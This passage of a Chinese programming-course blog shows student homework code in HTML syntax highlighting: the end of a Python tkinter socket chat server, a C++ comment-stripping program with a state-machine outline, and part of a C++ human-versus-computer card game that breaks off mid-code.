class="token punctuation">&#123;</span>msg<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token comment"># Client has disconnected, so close the client socket</span>            self<span class="token punctuation">.</span>client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>    <span class="token keyword">def</span> <span class="token function">send_message</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Get message from entry box</span>        msg <span class="token operator">=</span> self<span class="token punctuation">.</span>entry_box<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Send message to client</span>        self<span class="token punctuation">.</span>client_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># Display message in text box</span>        self<span class="token punctuation">.</span>text_box<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tk<span class="token punctuation">.</span>END<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"You: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>msg<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>        <span class="token comment"># Clear entry box</span>        self<span class="token punctuation">.</span>entry_box<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> tk<span class="token punctuation">.</span>END<span class="token punctuation">)</span><span class="token comment"># Create server UI</span>root <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>server_ui <span class="token operator">=</span> ServerUI<span class="token punctuation">(</span>root<span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ul></li></ul><h3 id="作业4">作业4</h3><ul><li><p>题目要求：实现编译器的注释功能</p></li><li><p>参考：</p><ul><li>状态转移图</li><li>有效源代码</li><li>单行注释</li><li><code>多行</code>注释</li><li><code>字符串</code>单独考虑<ul><li>考虑转义符号 <code>\</code></li></ul></li><li>考虑除号 <code>\</code> 与注释符号 <code>\</code></li></ul></li><li><p>流程图和状态转移图 <imgsrc="https://cdn.jsdelivr.net/gh/Jf710001011/pictureBed@main/img/202303160016081.png"alt="comment" /></p></li><li><p>代码</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    string file_name<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"输入你要注释的文件："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    ifstream <span class="token function">input_file</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>input_file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cerr <span class="token operator">&lt;&lt;</span> <span class="token string">"错误，不能打开输入文件。"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"输入保存结果的文件："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cin <span class="token operator">>></span> file_name<span class="token punctuation">;</span>    ofstream <span class="token function">ouput_file</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ouput_file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cerr <span class="token operator">&lt;&lt;</span> <span class="token string">"错误，不能打开输出文件。"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> in_string <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token comment">// 在字符串中</span>    <span class="token keyword">bool</span> in_single_com <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token comment">// 一个单行注释</span>    <span class="token keyword">bool</span> in_mult_com <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token comment">// 多行注释</span>    <span class="token keyword">char</span> pre_ch <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>          <span class="token comment">// 上一个字符</span>    <span class="token keyword">char</span> cur_ch<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>input_file<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur_ch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>in_string<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur_ch <span class="token operator">==</span> <span class="token char">'\"'</span> <span class="token operator">&amp;&amp;</span> pre_ch <span class="token operator">!=</span> <span class="token char">'\\'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                in_string <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            ouput_file <span class="token operator">&lt;&lt;</span> cur_ch<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>in_single_com <span class="token operator">&amp;&amp;</span> cur_ch <span class="token operator">==</span> <span class="token char">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            in_single_com <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cur_ch <span class="token operator">==</span> <span class="token char">'/'</span> <span class="token operator">&amp;&amp;</span> pre_ch <span class="token operator">==</span> <span class="token char">'*'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            in_mult_com <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur_ch <span class="token operator">==</span> <span class="token char">'"'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                in_string <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                ouput_file <span class="token operator">&lt;&lt;</span> cur_ch<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>pre_ch <span class="token operator">==</span> <span class="token char">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    in_single_com <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pre_ch <span class="token operator">==</span> <span class="token char">'*'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    in_mult_com <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    ouput_file <span class="token operator">&lt;&lt;</span> cur_ch<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        pre_ch <span class="token operator">=</span> cur_ch<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h3 id="作业3">作业3</h3><ul><li><p>总结与反思</p><ul><li>画流程图：还是得先画主线和框架</li><li>还是得多用python才方便</li></ul></li><li><p>要求：</p><ul><li>人机打牌</li></ul></li><li><p>思路：</p><ul><li>决定谁出牌</li><li>首次出牌与跟牌两种模式</li></ul></li><li><p>代码</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span>  <span class="token comment">// 包含shuffle函数</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;chrono></span>  <span class="token comment">// 包含获取时间的函数，用于产生随机数种子</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;map></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;random></span>  <span class="token comment">// 包含随机数引擎类</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TOTAL</span> <span class="token expression"><span class="token number">54</span></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token comment">// 生成一副扑克牌</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">generate_poker</span><span class="token punctuation">(</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> rank_map<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> cards<span class="token punctuation">;</span>    <span class="token comment">// 花色</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> colors<span class="token punctuation">&#123;</span><span class="token string">"Hearts"</span><span class="token punctuation">,</span> <span class="token string">"Diamonds"</span><span class="token punctuation">,</span> <span class="token string">"Clubs"</span><span class="token punctuation">,</span> <span class="token string">"Spades"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 牌</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> nums <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span>  <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span>                           <span class="token string">"9"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">,</span> <span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> ranks <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span>         <span class="token string">"6"</span><span class="token punctuation">,</span>                            <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">,</span>        <span class="token string">"J"</span><span class="token punctuation">,</span>                            <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"red joker"</span><span class="token punctuation">,</span> <span class="token string">"black joker"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> colors<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            string tmp <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"-"</span> <span class="token operator">+</span> colors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            cards<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cards<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token string">"red joker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cards<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token string">"black joker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 规定大小规则=</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ranks<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        rank_map<span class="token punctuation">[</span>ranks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> cards<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 洗牌</span><span class="token keyword">void</span> <span class="token function">randCards</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span> cards<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> seed <span class="token operator">=</span> chrono<span class="token double-colon punctuation">::</span>system_clock<span class="token double-colon punctuation">::</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">time_since_epoch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">shuffle</span><span class="token punctuation">(</span>cards<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cards<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">default_random_engine</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 牌的排序规则</span><span class="token keyword">bool</span> <span class="token function">compare</span><span class="token punctuation">(</span>string a<span class="token punctuation">,</span> string b<span class="token punctuation">,</span> map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> rank_map<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>rank_map<span class="token punctuation">[</span>a<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span>            rank_map<span class="token punctuation">[</span>b<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 发牌器发牌</span><span class="token keyword">void</span> <span class="token function">disTributi</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span> cards<span class="token punctuation">,</span>                vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span> player<span class="token punctuation">,</span>                vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span> computer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> cards<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            player<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>cards<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            computer<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>cards<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 比牌</span><span class="token keyword">int</span> <span class="token function">CompareCards</span><span class="token punctuation">(</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> rank_map<span class="token punctuation">,</span>                 <span class="token keyword">const</span> string<span class="token operator">&amp;</span> computer_c<span class="token punctuation">,</span>                 <span class="token keyword">const</span> string<span class="token operator">&amp;</span> player_c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>rank_map<span class="token punctuation">[</span>computer_c<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> computer_c<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">></span>        rank_map<span class="token punctuation">[</span>player_c<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> player_c<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rank_map<span class="token punctuation">[</span>computer_c<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> computer_c<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span>               rank_map<span class="token punctuation">[</span>player_c<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> player_c<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> cards<span class="token punctuation">;</span>     <span class="token comment">// 发牌器</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> player<span class="token punctuation">;</span>    <span class="token comment">// 玩家</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> table<span class="token punctuation">;</span>     <span class="token comment">// 桌子</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> computer<span class="token punctuation">;</span>  <span class="token comment">// 电脑</span>    map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> rank_map<span class="token punctuation">;</span>    <span class="token keyword">int</span> order <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 电脑出牌</span>    <span class="token keyword">int</span> mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">// 出牌模式为首次出牌</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 生成扑克牌</span>    cards <span class="token operator">=</span> <span class="token function">generate_poker</span><span class="token punctuation">(</span>rank_map<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 洗牌</span>    <span class="token function">randCards</span><span class="token punctuation">(</span>cards<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 发牌器发牌</span>    <span class="token function">disTributi</span><span class="token punctuation">(</span>cards<span class="token punctuation">,</span> player<span class="token punctuation">,</span> computer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 将手上的牌进行排序</span>    <span class="token function">sort</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> player<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">[</span>rank_map<span class="token punctuation">]</span><span class="token punctuation">(</span>string a<span class="token punctuation">,</span> string b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">compare</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> rank_map<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>computer<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> computer<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">[</span>rank_map<span class="token punctuation">]</span><span class="token punctuation">(</span>string a<span class="token punctuation">,</span> string b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">compare</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> rank_map<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 出牌顺序</span>    order <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 判胜负</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>computer<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>player<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>computer<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"失败！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"胜利！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"再来一局：y/n "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            <span class="token keyword">char</span> again<span class="token punctuation">;</span>            cin <span class="token operator">>></span> again<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>again <span class="token operator">==</span> <span class="token char">'y'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                order <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 显示桌面上的牌</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"桌面上的牌："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> table<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">","</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mode <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>order <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 首次出牌且电脑出牌</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"这一轮电脑首次出牌："</span> <span class="token operator">&lt;&lt;</span> computer<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            table<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>computer<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 电脑弹出第一张牌</span>            computer<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>computer<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            mode <span class="token operator">=</span> <span class="token 